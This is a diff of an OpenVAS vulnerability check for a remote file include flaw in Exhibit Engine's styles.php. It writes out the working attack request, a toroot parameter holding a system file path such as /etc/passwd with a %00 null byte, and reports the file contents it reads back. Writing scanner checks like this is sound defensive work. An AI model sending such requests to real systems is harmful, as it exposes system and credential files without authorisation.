@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: exhibit_engine_rfi.nasl 10702 2018-08-01 08:27:30Z cfischer $
+# $Id: exhibit_engine_rfi.nasl 11650 2018-09-27 10:32:13Z jschulte $
 #
 # Exhibit Engine toroot Parameter Remote File Include Vulnerability
 #
@@ -8,7 +8,7 @@
 # Justin Seitz <jms@bughunter.ca>
 #
 # Copyright:
-# Copyright (C) 2006 Justin Seitz
+# Copyright (C) 2008 Justin Seitz
 #
 # This program is free software; you can redistribute it and/or modify
 # it under the terms of the GNU General Public License version 2,
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.80058");
-  script_version("$Revision: 10702 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-01 10:27:30 +0200 (Wed, 01 Aug 2018) $");
+  script_version("$Revision: 11650 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-27 12:32:13 +0200 (Thu, 27 Sep 2018) $");
   script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
@@ -36,9 +36,9 @@ if(description)
   script_bugtraq_id(20793);
   script_name("Exhibit Engine toroot Parameter Remote File Include Vulnerability");
   script_category(ACT_ATTACK);
-  script_copyright("This script is Copyright (C) 2006 Justin Seitz");
+  script_copyright("This script is Copyright (C) 2008 Justin Seitz");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
@@ -65,40 +65,46 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
 if(!can_host_php(port:port)) exit(0);
 
-file = "/etc/passwd";
+files = traversal_files();
 
 foreach dir( make_list_unique( "/gallery", "/photos", "/images", "/exhibit", "/exhibitengine", "/ee", cgi_dirs( port:port ) ) ) {
 
   install = dir;
   if( dir == "/" ) dir = "";
 
-  # Attack: Attempt a remote file include of /etc/passwd
-  req = http_get(item:string(dir, "/styles.php?toroot=", file, "%00"),port:port);
-  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-  if (res == NULL) continue;
+  foreach pattern(keys(files)) {
 
-  if (egrep(pattern:"root:.*:0:[01]:", string:res) ||
-    string("main(", file, "\\0styles/original.php): failed to open stream") >< res ||
-    string("main(", file, "): failed to open stream: No such file") >< res ||
-    "open_basedir restriction in effect. File(" >< res)   {
+    file = files[pattern];
 
-    passwd = "";
-    if (egrep(pattern:"root:.*:0:[01]:", string:res))
-      passwd = res;
+    # Attack: Attempt a remote file include of /etc/passwd
+    req = http_get(item:string(dir, "/styles.php?toroot=", file, "%00"),port:port);
+    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
+    if (res == NULL) continue;
 
-    if (passwd) {
-      info = string("The version of Exhibit Engine installed in directory '", install, "'\n",
-        "is vulnerable to this issue. Here are the contents of /etc/passwd\n",
-        "from the remote host :\n\n", passwd);
+    if (egrep(pattern:pattern, string:res) ||
+      string("main(", file, "\\0styles/original.php): failed to open stream") >< res ||
+      string("main(", file, "): failed to open stream: No such file") >< res ||
+      "open_basedir restriction in effect. File(" >< res)   {
+
+      passwd = "";
+      if (egrep(pattern:pattern, string:res))
+        passwd = res;
+
+      if (passwd) {
+        info = string("The version of Exhibit Engine installed in directory '", install, "'\n",
+          "is vulnerable to this issue. Here are the contents of /" + file + "\n",
+          "from the remote host :\n\n", passwd);
+      }
+      else info = "";
+
+      security_message(data:info, port:port);
+      exit(0);
     }
-    else info = "";
-
-    security_message(data:info, port:port);
-    exit(0);
   }
 }
 
